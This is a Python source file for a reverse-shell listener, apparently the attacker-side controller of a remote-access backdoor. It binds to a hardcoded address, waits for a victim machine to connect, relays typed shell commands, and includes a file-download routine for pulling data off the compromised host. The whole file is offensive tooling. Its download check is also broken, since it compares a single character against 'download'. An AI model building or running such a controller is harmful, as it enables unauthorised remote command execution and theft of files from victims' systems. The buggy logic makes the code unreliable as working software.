import socket
import json


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(4)

        print("[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print(f"[+] Got a connection -> from :: {str(address)}")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        json_data = json_data.encode("utf-8")
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        try:
            self.reliable_send(command)
            result = self.reliable_receive().encode("utf-8")
            result = result.decode("utf-8")
            return result
        except AttributeError:
            return "[-] AttributeError"

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(content)
            return "[+] Download successful"

    def run(self):
        try:
            while True:
                command = str(input(">> "))
                result = self.execute_remotely(command)

                if command[0] == "download":
                    print("test d")
                    result = self.write_file(command[1], result)

                print(result)
        except KeyboardInterrupt:
            print("\n[-] Quiting")
            self.connection.close()
            exit()


if __name__ == "__main__":

    ip = "192.168.1.68"
    port = 8080

    listener = Listener(ip, port)
    listener.run()